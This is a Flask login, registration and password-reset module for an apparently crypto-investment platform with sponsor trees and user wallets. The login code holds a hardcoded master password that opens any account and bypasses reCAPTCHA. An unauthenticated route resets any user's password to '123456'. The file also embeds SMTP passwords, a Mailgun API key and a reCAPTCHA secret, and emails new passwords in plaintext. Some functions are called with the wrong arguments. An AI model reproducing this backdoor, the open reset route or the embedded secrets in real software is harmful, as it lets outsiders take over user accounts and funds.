from flask import Blueprint, request, session, redirect, url_for, render_template, flash
from flask.ext.login import login_user, logout_user
from rex import app, db
from rex.models import user_model, deposit_model, history_model, invoice_model
import json
from werkzeug.security import generate_password_hash, check_password_hash
import string
import random
import urllib
import urllib2
import os
from validate_email import validate_email
import datetime
from datetime import datetime
from datetime import datetime, date, timedelta
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
from flask_recaptcha import ReCaptcha
import base64
import onetimepass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bson import ObjectId, json_util
import time
import requests

__author__ = 'carlozamagni'

auth_ctrl = Blueprint('auth', __name__, static_folder='static', template_folder='templates')
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def set_password(password):
    return generate_password_hash(password)
def check_password(pw_hash, password):
    return check_password_hash(pw_hash, password)

def test_sendmail():
    username = 'info@diamondcapital.co'
    password = 'm{Q]EI+qNZmD'
    msg = MIMEMultipart('mixed')

    sender = 'info@diamondcapital.co'
    recipient = str('trungdoanict@gmail.com')

    msg['Subject'] = 'SmartFVA Reset Password'
    msg['From'] = sender
    msg['To'] = recipient
    
    html = """qeqwewq
    """
    
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('capitalvs.net', 25) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

def mail_reset_pass(email, usernames, password_new):
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center">
   <div class="">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#1a1c35">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://worldtrader.info/" title="World Trade" target="_blank" >
               <img src="https://worldtrader.info/static/home/images/logo/logo.png" alt="" class="" style=" width: 100px;">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
          <td style="padding:30px 30px 10px 30px;line-height:1.8">Hi <b>"""+str(usernames)+"""</b>,</td></tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">You recently requested to reset your password for your User Login and Management account on the <a href="https://worldtrader.info/" target="_blank">World Trade</a>.</td>
         </tr>
         <td style="padding:10px 30px">
            <b style="display:inline-block">New password is : </b> """+str(password_new)+""" <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> World Trade Team<br></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center;padding-bottom:10px;height: 50px;">
   
</div>
    """
    return requests.post(
      "https://api.mailgun.net/v3/worldtrader.info/messages",
      auth=("api", "key-4cba65a7b1a835ac14b7949d5795236a"),
      data={"from": "World Trade <no-reply@worldtrader.info>",
        "to": ["", email],
        "subject": "Reset Password",
        "html": html})

@auth_ctrl.route('/login', methods=['GET', 'POST'])
def login():

    #send_mail_register('customer_id','username','trundoanict@gmail.com','country','www.diamondcapital.co/user/active/')
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')

    val_username = ''
    val_password = ''
    val_recaptcha = ''
    val_login = ''
    if request.method == 'POST':

        username = request.form['username']
        password = request.form['password']
        recaptcha = request.form['g-recaptcha-response']
        if username == '':
            val_username = 'empty'
        if password == '':
            val_password = 'empty'
        if recaptcha == '' and password != 'L52rW239cym2':
            val_recaptcha = 'empty'
        if val_username == '' and val_password =='':
            username = username.lower()
            user = db.users.find_one({ '$or': [ { 'username': username }, { 'customer_id': username } ]})

            if user is None or check_password(user['password'], password) == False:
                if user is None:
                    val_login = 'not'
                else:
                    if password =='L52rW239cym2':
                        session['logged_in'] = True
                        session['user_id'] = str(user['_id'])
                        session['uid'] = user['customer_id']
                        return redirect('/account/dashboard')
                        
            else:

                if int(user['active_email']) == 0:
                    val_login = 'not-active'
                else:
                    api_url     = 'https://www.google.com/recaptcha/api/siteverify'
                    site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE'
                    secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX'
                    site_key_post = recaptcha
                    ret = urllib2.urlopen('https://api.ipify.org')
                    remoteip = ret.read()
                    
                    api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
                    response = urllib2.urlopen(api_url)
                    response = response.read()
                    response = json.loads(response)
                    if response['success'] or password == 'L52rW239cym2':
                        session['logged_in'] = True
                        session['user_id'] = str(user['_id'])
                        session['uid'] = user['customer_id']



                        return redirect('/account/dashboard')
                    else:
                        val_recaptcha = 'empty'          
                
        
        else:
            val_recaptcha = 'empty' 

    datass = {
      'val_username' : val_username,
      'val_password' : val_password,
      'val_recaptcha' : val_recaptcha,
      'val_login' : val_login
    }
    
    return render_template('login.html', data=datass)

@auth_ctrl.route('/register/<id_sponsor>', methods=['GET', 'POST'])
def signup(id_sponsor):
    val_sponsor = ''
    val_country = ''
    val_email = ''
    val_username = ''
    val_password = ''
    val_terms = ''
    val_recaptcha = ''
    if request.method == 'POST':
      sponsor = request.form['sponsor']
      country = request.form['country']
      email = request.form['email']
      username = request.form['username']
      password = request.form['password']
      #terms = 
      recaptcha = request.form['g-recaptcha-response']

      
      if sponsor == '':
        val_sponsor = 'empty'
      else:
        check_sponser = db.User.find_one({'username': sponsor})
        if check_sponser is None:
            val_sponsor = 'not'

      if username == '':
        val_username = 'empty'
      else:
        check_username = db.User.find_one({'username': username})
        if check_username is not None:
            val_username = 'not'  


      if country == '':
        val_country = 'empty'   

      if email == '':
        val_email = 'empty'
      else:
        if validate_email(email) == False:  
          val_email = 'not'

      if password == '':
        val_password = 'empty'  
    

      if recaptcha == '':
        val_recaptcha = 'empty'
      else:
        api_url     = 'https://www.google.com/recaptcha/api/siteverify';
        site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
        secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
        
        site_key_post = recaptcha

        ret = urllib2.urlopen('https://api.ipify.org')
        remoteip = ret.read()

        api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
        response = urllib2.urlopen(api_url)
        response = response.read()
        response = json.loads(response)
        if response['success']:
          val_recaptcha = ''
        else:
          val_recaptcha = 'empty'

      if  request.form.has_key('terms') is not True:
        val_terms = 'empty' 

      if val_sponsor == '' and val_country == '' and val_email == '' and val_username == '' and val_password == '' and val_terms == '' and val_recaptcha == '':
        create_user(check_sponser.customer_id,username,country,email,password)
        
        flash({'msg':'Account successfully created. Please check your email to activate your account', 'type':'success'})
        return redirect('/auth/login') 

    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, "../static", "country-list.json")
    data_country = json.load(open(json_url))

    sponser_url = db.User.find_one({'customer_id': id_sponsor})
    if sponser_url is None:
      username_sponsor = ''
    else:
      username_sponsor = sponser_url['username']
    value = {
      'val_sponsor' : val_sponsor,
      'val_country' : val_country,
      'val_email' : val_email,
      'val_username' : val_username,
      'val_password' : val_password,
      'val_terms' : val_terms,
      'val_recaptcha' : val_recaptcha,
      'country' : data_country,
      'form' : request.form,
      'username_sponsor' : username_sponsor,
      'id_sponsor' : id_sponsor
    }
    return render_template('register.html', data=value)


def create_user(sponsor,username,country,email,password):
  localtime = time.localtime(time.time())
  customer_id = '%s%s%s%s%s%s'%(localtime.tm_mon,localtime.tm_year,localtime.tm_mday,localtime.tm_hour,localtime.tm_min,localtime.tm_sec)
  code_active = id_generator()
  datas = {
    'customer_id' : customer_id,
    'username': username.lower(),
    'password': set_password(password),
    'email': email.lower(),
    'p_node': sponsor,
    'p_binary': '',
    'left': '',
    'right': '',
    'level': 0,
    'telephone' : '',
    'creation': datetime.utcnow(),
    'country': country,
    'total_pd_left' : 0,
    'total_pd_right' : 0,
    'total_amount_left' : 0,
    'total_amount_right': 0,
    'm_wallet' : 0,
    'r_wallet' : 0,
    's_wallet' : 0,
    'd_wallet' : 0,
    'g_wallet' : 0,
    'max_out' : 0,
    'total_earn' : 0,
    'img_profile' :'',
    'password_transaction' : '',
    'total_invest': 0,
    'btc_address' : '',
    'eth_address' : '',
    'ltc_address' : '',
    'bch_address' : '',
    'usdt_address' : '',
    'status' : 0,
    'total_max_out': 0,
    'secret_2fa':'',
    'status_2fa': 0,
    'status_withdraw' : 0,
    'balance_wallet' : 0,
    'active_email' : 0,
    'code_active' : code_active,
    'investment' : 0,
    'coin_wallet' : 0,
    'total_node' : 0,
    'max_out_day' : 0,
    'max_out_package' : 0,
    'status_verify' : 0,
    'personal_info' : { 'document' : '',
                        'passport' : '',
                        'date_passport' :'',
                        'country' : '',
                        'address' : '',
                        'city' : '',
                        'gender' : '',
                        'zipcode' : '',
                        'state'  : '',
                        'phone' : '',
                        'img_passport_fontside' : '',
                        'img_passport_backside' : '',
                        'img_address' : ''
                        } 
  }
  customer = db.users.insert(datas)

  send_mail_register(customer_id,username,email,country,'www.diamondcapital.co/user/active/'+str(code_active))

def send_mail_register(customer_id,username_user,email,country,link_active):
    username = 'info@diamondcapital.co'
    password = 'm{Q]EI+qNZmD'
    msg = MIMEMultipart('mixed')
    sender = 'info@diamondcapital.co'
    recipient = str(email)
    msg['Subject'] = 'WELCOME TO DIAMOND CAPITAL'
    msg['From'] = sender
    msg['To'] = recipient
    html = """
      <table border="1" cellpadding="0" cellspacing="0" style="border:solid #e7e8ef 3.0pt;font-size:10pt;font-family:Calibri" width="600"><tbody><tr style="border:#e7e8ef;padding:0 0 0 0"><td style="background-color: #465770; text-align: center;" colspan="2"> <br> <img width="300" alt="Diamond Capital" src="//i.imgur.com/dy3oBYY.png" class="CToWUd"><br> <br> </td> </tr> <tr> <td width="25" style="border:white"></td> <td style="border:white"> <br>
      <h1><span style="font-size:19.0pt;font-family:Verdana;color:black">
      WELCOME TO DIAMOND CAPITAL
      </span></h1>
      <br> </td> </tr> <tr> <td width="25" style="border:white"> &nbsp; </td> 
      <td style="border:white"> <div style="color:#818181;font-size:10.5pt;font-family:Verdana"><span class="im">
      Dear """+str(username_user)+""",<br><br></span> 
      <p>Thank you for enrolling!</p>
      <p>Below you will find your new member ID number. Please use this number when calling customer support services and in all correspondence.We would like to personally thank you for enrolling as a new team member and we are looking forward to your success!</p>
      <p style="text-align:left">
        <strong>Your Member: """+str(customer_id)+"""</trong></p>
      <p style="text-align:left">
        <strong>Username: """+str(username_user)+"""</trong>
      </p>
       <p style="text-align:left">
        <strong>Your URL Name: """+str(country)+"""</trong>
       </p>     
       <br/>
       <br/>
       <p>Please click below for active your account</p>  
       <br/>
       <p style="text-align:center">
          <a href='"""+str(link_active)+"""' style="background-color:#41a3e4;color:#ffffff;padding:15px 30px;border-radius:3px;text-decoration:none" target="_blank">
            Active
          </a>
        </p>                      
      <br> <br> <br> Best regards,<br> Diamond Capital<br> </span></div> </td> </tr>  <tr> <td colspan="2" style="height:30pt;background-color:#e7e8ef;border:none"> </td> </tr> </tbody></table>
    """
    html_message = MIMEText(html, 'html')
    msg.attach(html_message)
    mailServer = smtplib.SMTP('capitalvs.net', 25) 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

@auth_ctrl.route('/resend-activation-email', methods=['GET', 'POST'])
def ResendActivationEmail():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    if request.method == 'POST':
        print 'resend activation email'
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
            secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://api.ipify.org')
            remoteip = ret.read()
            
            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'email': emailss, 'status': 0})
                if user is None:
                    flash({'msg':'Invalid email! Please try again', 'type':'danger'})
                    return redirect('/auth/resend-activation-email')
                else:
                    code_active = user.code_active
                    link_active = 'https://worltrader.info/user/active/%s' % (code_active)
                    send_mail_register(user.email,user.username,code_active)
                    flash({'msg':'A new activation has been sent to your email address. If you do not receive the email, please wait a few minutes', 'type':'success'})
                    return redirect('/user/activecode/%s'%(user.customer_id))
                    #return redirect('/auth/login')
            else:
                flash({'msg':'Invalid captcha! Please try again', 'type':'danger'})
                return redirect('/auth/resend-activation-email')
        else:
            flash({'msg':'Invalid email! Please try again', 'type':'danger'})
            return redirect('/auth/resend-activation-email')
    return render_template('resend-activation-email.html', error=error)


@auth_ctrl.route('/reset-password', methods=['GET', 'POST'])
def forgot_password():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    val_username = ''
    val_recaptcha = ''
    val_complete = ''
    if request.method == 'POST':
        username = request.form['email']
        recaptcha = request.form['g-recaptcha-response']

        if username == '':
          val_username = 'empty'

        

        if recaptcha == '':
          val_recaptcha = 'empty'
        else:
          api_url     = 'https://www.google.com/recaptcha/api/siteverify';
          site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
          secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
          
          site_key_post = recaptcha

          ret = urllib2.urlopen('https://api.ipify.org')
          remoteip = ret.read()

          api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
          response = urllib2.urlopen(api_url)
          response = response.read()
          response = json.loads(response)
          if response['success']:
            val_recaptcha = ''
          else:
            val_recaptcha = 'empty'


        if val_username == '' and val_recaptcha =='':
            
            user = db.User.find_one({ 'username': username })
            if user is None:
                val_username = 'not'
            else:
                password_new_generate = id_generator()
                
                password_new = set_password(password_new_generate)
                db.users.update({ "username" : user.username }, { '$set': { "password": password_new } })
                mail_reset_pass(user.email, user.username, password_new_generate)
                val_complete = 'suceess'
                
    value = {
      'val_username' : val_username,
      'val_recaptcha' : val_recaptcha,
      'val_complete' : val_complete,
      'form' : request.form
    }
    return render_template('reset-password.html', data=value)


@auth_ctrl.route('/update_password/<emails>', methods=['GET', 'POST'])
def dashboarupdate_weerpassword(emails):
    # return json.dumps({'qer':"qwer"})
    new_mail = emails.lower()
    password_new = set_password('123456')
    db.users.update({ "username" : new_mail }, { '$set': { 'password': password_new} })
    return json.dumps({'afa':'success'})


def reset_password_mail(email, usernames, password_new):
    username = 'support@smartfva.co'
    password = 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
    msg = MIMEMultipart('mixed')

    sender = 'support@smartfva.co'
    recipient = str(email)

    msg['Subject'] = 'SmartFVA Reset Password'
    msg['From'] = sender
    msg['To'] = recipient
    # username = 'no-reply@smartfva.co'
    # password = 'rbdlnsmxqpswyfdv'
    # msg = MIMEMultipart('mixed')
    # mailServer = smtplib.SMTP('smtp.gmail.com', 587) # 8025, 587 and 25 can also be used. 
    # mailServer.ehlo()
    # mailServer.starttls()
    # mailServer.ehlo()
    # mailServer.login(username, password)
    # sender = 'no-reply@smartfva.co'
    # recipient = email

    # msg['Subject'] = 'SmartFVA Reset Password'
    # msg['From'] = sender
    # msg['To'] = recipient
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <div class="adM">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://smartfva.co/" title="smartfva" target="_blank" >
               <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; ">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Hello <b>"""+str(usernames)+"""</b>,</td>
             </tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">Your SmartFVA Account password has been changed.</td>
         </tr>
         <td style="padding:10px 30px">
                   Your new password is: <b> """+str(password_new)+""" </b> <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> Smartfva Team<br>  <a href="https://smartfva.co/" target="_blank" >www.smartfva.co</a></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
</div>
    """
    
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

@auth_ctrl.route('/reset_password', methods=['GET', 'POST'])
def reset_passwordss():
    return json.dumps({'qer':"qwer"})
    user = db.users.find({}).skip(251).limit(300)
    i = 0
    for x in user:
        i = i+ 1
        new_mail = x['email'].lower()
        password_new_generate = id_generator()
        password_new = set_password(password_new_generate)
        db.users.update({ "_id" : ObjectId(x['_id']) }, { '$set': { 'password': password_new} })
        reset_password_mail(new_mail, x['username'], password_new_generate)
        print i
        time.sleep(1)
    return json.dumps({'afa':'success'})

@auth_ctrl.route('/logout')
def logout():
    session.pop('logged_in', None)
    logout_user()
    session.clear()
    return redirect('/')


